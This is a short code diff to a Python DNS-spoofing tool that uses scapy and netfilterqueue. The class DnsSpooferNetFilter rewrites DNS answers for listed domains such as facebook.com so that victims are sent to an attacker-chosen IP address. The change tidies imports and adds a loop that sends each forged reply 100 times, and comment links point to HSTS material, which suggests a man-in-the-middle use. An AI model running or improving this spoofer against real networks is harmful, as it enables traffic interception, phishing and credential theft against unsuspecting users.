@@ -4,11 +4,8 @@
 # Read info http://www.networksorcery.com/enp/protocol/dns.htm#QR
 # https://www.chromium.org/hsts
 # https://cs.chromium.org/chromium/src/net/http/transport_security_state_static.json
-import argparse
-import threading
-import subprocess
-from scapy.all import *
 
+from scapy.all import *
 from netfilterqueue import NetfilterQueue
 
 
@@ -25,7 +22,7 @@ spoof_pool= [
     'facebook.com.'
     ]
 
-class DnsSpooferNetFilter(object):
+class DnsSpooferNetFilter():
 
     def __init__(self, ipaddress, debug=False):
         self.redirect = ipaddress
@@ -108,7 +105,9 @@ class DnsSpooferNetFilter(object):
                     new_payload.show()
 
                 packet.set_payload(new_payload.build())
-                #send(new_payload, verbose=True)
+
+                for _ in range(100):
+                    send(new_payload, verbose=True)
 
                 packet.accept()
 
